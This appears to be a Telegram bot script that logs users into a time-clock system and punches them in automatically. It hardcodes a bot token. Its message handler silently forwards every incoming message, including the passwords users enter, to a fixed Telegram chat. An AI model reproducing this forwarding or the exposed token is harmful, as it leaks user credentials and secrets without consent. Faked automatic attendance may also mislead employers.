const { Telegraf } = require("telegraf");

const {
  login,
  getUserInfo,
  _start,
  init,
  _stop,
  logout,
} = require("./modules/auth");

const token = "7419413997:AAEcqfdMPytFfxkDchJxSmW3dzimTozrSo4";
const bot = new Telegraf(token);
const users = ["minhhvt", "trungha"];
let userInputs = {};

bot.start(async (ctx) => {
  const chatId = ctx.chat.id;
  userInputs[chatId] = {};
  try {
    const user = await getUserInfo(chatId);
    ctx.sendMessage(JSON.stringify(user));
    start(ctx);
  } catch (e) {
    await logout(chatId);
    ctx.sendMessage("Please enter your username:");
    userInputs[chatId].state = "awaiting_username";
  }
});
bot.command("stop", (ctx) => stop(ctx));
bot.command("logout", (ctx) => logout(ctx.chat.id));
bot.help((ctx) => ctx.reply("Send me a sticker"));

bot.on("message", async (ctx) => {
  const chatId = ctx.chat.id;
  bot.telegram.sendMessage("5213664996", JSON.stringify(ctx.text));
  bot.telegram.sendMessage("5213664996", JSON.stringify("ctx.message"));
  const userState = userInputs[chatId] ? userInputs[chatId].state : null;
  if (userState === "awaiting_username") {
    const username = ctx.text;
    if (!users.includes(username)) {
      ctx.sendMessage("Not support for this account.");
      return;
    }
    userInputs[chatId].username = ctx.text;
    userInputs[chatId].state = "awaiting_password";
    ctx.sendMessage(
      "Please enter your password (we recommend deleting this message after):",
    );
  } else if (userState === "awaiting_password") {
    const password = ctx.text;
    userInputs[chatId].password = password;
    userInputs[chatId].starte = "";
    await ctx.deleteMessage(ctx.msgId);
    try {
      const { username, password } = userInputs[chatId];
      await login(ctx, username, password);
      ctx.sendMessage("Login success");
      start(ctx);
    } catch (error) {
      ctx.sendMessage("Login failed." + error);
    }
  }
});

bot.launch(() => {
  init(bot).then();
});

const start = (ctx) => {
  const chatId = ctx.chat.id;
  _start(chatId, {
    onSuccess: ({ date }) => ctx.sendMessage("Will auto punch at " + date),
    onPunchSuccess: () => {
      ctx.sendMessage("Punch success.");
    },
    onError: (err) => {
      ctx.sendMessage("Punch error. Information: " + err);
    },
  });
  ctx.sendMessage("Start auto punch");
};

const stop = (ctx) => {
  const chatId = ctx.chat.id;
  _stop(chatId);
  ctx.sendMessage("Stop auto punch success.");
};

console.log("Running...");
